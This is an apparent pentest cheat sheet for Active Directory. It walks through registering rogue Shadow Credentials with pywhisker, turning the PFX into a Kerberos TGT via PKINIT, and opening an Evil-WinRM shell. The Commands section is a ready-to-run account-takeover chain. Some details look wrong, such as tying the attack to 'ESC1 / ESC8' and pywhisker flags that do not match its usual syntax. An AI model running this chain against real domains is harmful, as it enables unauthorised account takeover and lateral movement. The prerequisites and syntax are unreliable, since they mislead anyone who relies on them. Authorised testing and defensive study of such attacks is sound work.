
# Shadow Credentials → PKINIT TGT → User Shell

**TL;DR**  
Abuse **Shadow Credentials** using `pywhisker` to register a rogue certificate for a user account. With that certificate, use **PKINIT** to request a Kerberos **TGT**. Load the ticket (ccache) and authenticate via **Evil‑WinRM** or other Kerberos-aware tooling to obtain a shell.

---

## Goal

- Add malicious **certificate-based credentials** (Shadow Creds) to a target AD user via `pywhisker`.
- Use the resulting PFX to request a Kerberos TGT via `gettgtpkinit.py`.
- Load TGT and confirm with `klist`.
- Leverage Kerberos auth (`-r` realm flag or environment ticket) in `evil-winrm` for shell.

## Prerequisites

- `pywhisker` cloned and working environment (`pip install -r requirements.txt`).
- `PKINITtools` and `oscrypto` fix configured.
- Attacker host has `/etc/krb5.conf` pointing to correct realm and DC.
- Domain user target is **shadow-credential vulnerable** (ESC1 / ESC8 scenario).  
- Time sync maintained for Kerberos.

---

## High-Level Flow

1) `pywhisker add` → register malicious certificate for target user.  
2) Export `.pfx` certificate.  
3) Use `gettgtpkinit.py` to request TGT.  
4) Export ccache, set `KRB5CCNAME`.  
5) Confirm with `klist`.  
6) Use `evil-winrm -r` or Kerberos auth option to get shell.

---

## Commands

### 1) Add Shadow Credential

```bash
# Example syntax, adjust for victim user & domain
python3 pywhisker.py add \
  -d domain.local \
  -u alice \
  -p 'Password1!' \
  --target "alice@domain.local" \
  --pfx alice.pfx \
  --pass alicePFXpass
```

> This registers a new key credential link for the user. Confirm the PFX saved correctly.

### 2) Request TGT via PKINIT

```bash
# Base64 method or direct PFX usage
python3 gettgtpkinit.py domain.local/alice@DOMAIN.LOCAL \
  -cert-pfx alice.pfx \
  -pfx-pass alicePFXpass \
  -dc-ip DC_IP \
  alice.ccache
```

### 3) Export & Verify Ticket

```bash
export KRB5CCNAME=$(pwd)/alice.ccache
klist
```

> `klist` should show a valid TGT for `alice@DOMAIN.LOCAL`.

### 4) Kerberos Shell (Evil‑WinRM)

```bash
evil-winrm -i dc01.domain.local -r domain.local
# or with -s netexec (if using netexec/nxc) with -k for Kerberos
```

---

## Troubleshooting

- If `pywhisker add` fails, check ACLs and that Shadow Creds is not blocked (ESC1/ESC8 prerequisites).  
- If PKINIT errors, verify CA trust, correct user principal, time sync.  
- Ensure `/etc/hosts` maps `dc01.domain.local` to correct IP.  
- Confirm `KRB5CCNAME` is exported before running `evil-winrm`.

## What This Demonstrates

- Modern AD trust abuse via Shadow Credentials.  
- Certificate-based authentication for Kerberos (PKINIT) without password.  
- Lateral move to interactive shell using TGT only (no NTLM needed).

## Cleanup & Safety

- Remove rogue credential from the user post-testing (`pywhisker remove`).  
- Delete `.pfx` and `.ccache` from attacker host.  
- Report misconfiguration: enforce strong ACLs around KeyCredentialLink / Certificate Templates.

---

## Tools (reference)

- `pywhisker` — Shadow Credentials manipulation.  
- `gettgtpkinit.py` (PKINITtools) — TGT from PFX.  
- `evil-winrm` — Kerberos shell (with `-r` realm flag).  
- Optional: `netexec` with `-k` for Kerberos.
